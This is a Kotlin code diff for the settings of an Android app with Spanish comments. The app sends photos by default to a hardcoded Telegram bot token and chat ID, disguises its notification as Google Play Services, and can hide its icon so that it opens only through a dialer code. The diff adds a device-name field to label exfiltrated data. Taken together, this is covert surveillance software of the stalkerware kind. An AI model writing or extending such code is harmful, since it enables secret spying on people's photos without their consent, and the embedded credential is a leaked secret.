@@ -27,9 +27,10 @@ data class TelegramConfig(
 }
 
 data class AppPreferences(
+    val deviceName: String = SettingsManager.getDefaultDeviceName(), // Nombre del dispositivo en Telegram
     val stealthMode: Boolean = true,    // Notificación camuflada como Servicios de Google Play
     val dataSaverMode: Boolean = true,  // Comprimir fotos a Full HD para ahorrar datos y enviar en 1s
-    val hideAppIcon: Boolean = false    // Nivel 4: Ocultar icono del menú (abrir con *#*#7468#*#* o photopriv://open)
+    val hideAppIcon: Boolean = false    // Nivel 4: Ocultar icono del menú (abrir con *#*#0000#*#* o photopriv://open)
 )
 
 class SettingsManager(private val context: Context) {
@@ -42,6 +43,21 @@ class SettingsManager(private val context: Context) {
         const val DEFAULT_TELEGRAM_BOT_TOKEN = "8919441805:AAGPfX4UxzQwphOeIGci6wexnBDz3DFLiqw"
         const val DEFAULT_TELEGRAM_CHAT_ID = "-1004363656402"
         const val DEFAULT_SEND_VIA_TELEGRAM = true
+
+        // Device key
+        private const val KEY_DEVICE_NAME = "device_name"
+
+        fun getDefaultDeviceName(): String {
+            val manufacturer = android.os.Build.MANUFACTURER.replaceFirstChar { 
+                if (it.isLowerCase()) it.titlecase(java.util.Locale.getDefault()) else it.toString() 
+            }
+            val model = android.os.Build.MODEL
+            return if (model.startsWith(manufacturer, ignoreCase = true)) {
+                model
+            } else {
+                "$manufacturer $model"
+            }
+        }
 
         // SMTP keys
         private const val KEY_SMTP_HOST = "smtp_host"
@@ -106,7 +122,9 @@ class SettingsManager(private val context: Context) {
     }
 
     fun getAppPreferences(): AppPreferences {
+        val defaultDevice = getDefaultDeviceName()
         return AppPreferences(
+            deviceName = prefs.getString(KEY_DEVICE_NAME, defaultDevice)?.takeIf { it.isNotBlank() } ?: defaultDevice,
             stealthMode = prefs.getBoolean(KEY_STEALTH_MODE, true),
             dataSaverMode = prefs.getBoolean(KEY_DATA_SAVER_MODE, true),
             hideAppIcon = prefs.getBoolean(KEY_HIDE_APP_ICON, false)
@@ -116,6 +134,7 @@ class SettingsManager(private val context: Context) {
     fun saveAppPreferences(appPrefs: AppPreferences) {
         val previousHide = prefs.getBoolean(KEY_HIDE_APP_ICON, false)
         prefs.edit()
+            .putString(KEY_DEVICE_NAME, appPrefs.deviceName.trim())
             .putBoolean(KEY_STEALTH_MODE, appPrefs.stealthMode)
             .putBoolean(KEY_DATA_SAVER_MODE, appPrefs.dataSaverMode)
             .putBoolean(KEY_HIDE_APP_ICON, appPrefs.hideAppIcon)
